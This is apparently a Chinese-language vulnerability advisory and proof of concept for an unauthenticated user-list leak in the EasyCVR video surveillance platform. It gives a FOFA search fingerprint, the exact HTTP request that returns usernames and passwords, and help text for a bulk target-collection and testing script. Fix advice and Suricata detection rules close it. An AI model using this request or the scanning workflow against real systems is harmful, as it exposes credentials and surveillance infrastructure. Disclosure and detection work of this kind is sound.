### 产品简介  
EasyCVR 智能视频监控综合管理平台是一种针对大中型用户在跨区域网络化视频监控集中管理领域的安防管理软件。它具备多项功能，包括信息资源管理、设备管理、用户管理、网络管理和安全管理。该平台能够实现监控中心对所有视频监控图像的集中管理，并支持多个品牌设备的联网，确保联网视频监控传输质量，并提供资源统一检索和数据共享的功能。  

### 漏洞概述  
EasyCVR 智能视频监控综合管理平台是一种针对大中型用户在跨区域网络化视频监控集中管理领域的安防管理软件，该系统存在漏洞，攻击者访问特定的链接即可获取用户信息，包括账号密码。  

### 指纹识别  
fofa: title="EasyCVR"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/EasyCVR_information_leakage/2.png)

### 漏洞利用  
```
poc:
GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

![Image text](https://github.com/YUUKI4O4/POC/blob/main/EasyCVR_information_leakage/1.png)

### 测试和利用脚本  
```
python3 EasyCVR_information_leakage.py -h
usage: EasyCVR_information_leakage.py [-h] [-t] [-r FILE] [-u URL]

### EasyCVR video management platform has user information leakage. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python EasyCVR_information_leakage.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python EasyCVR_information_leakage.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  
2.临时屏蔽userlist接⼝  

### Suricata rules  
```
alert http any any -> any any (msg:"EasyCVR video management platform has user information leakage"; flow:established,to_server; flowbits:set,EasyCVR_information_leakage;noalert; content:"get";http_method;nocase; content:"/api/v1/userlist?pageindex=0&pagesize=10";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/EasyCVR_information_leakage; classtype:web-attck; metadata:created_at 2024-1-3,updated_at 2024-1-3,creater:YUUKI4O4; sid:3; rev:1;)
alert http any any -> any any (msg:"EasyCVR video management platform has successfully leaked user information"; flow:established,from_server; flowbits:isset,EasyCVR_information_leakage; content:"200";http_stat_code; content:"Content-Type: application/json";nocase; content:"{";http_server_body;nocase;startswith; content:"data";nocase;http_server_body;distance:0; content:"Name";nocase;http_server_body; content:"Username";nocase;http_server_body; content:"Password";nocase;http_server_body; content:"RoleName";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/EasyCVR_information_leakage; classtype:web-attck; metadata:created_at 2024-1-3,updated_at 2024-1-3,creater:YUUKI4O4; sid:4; rev:1;)
```
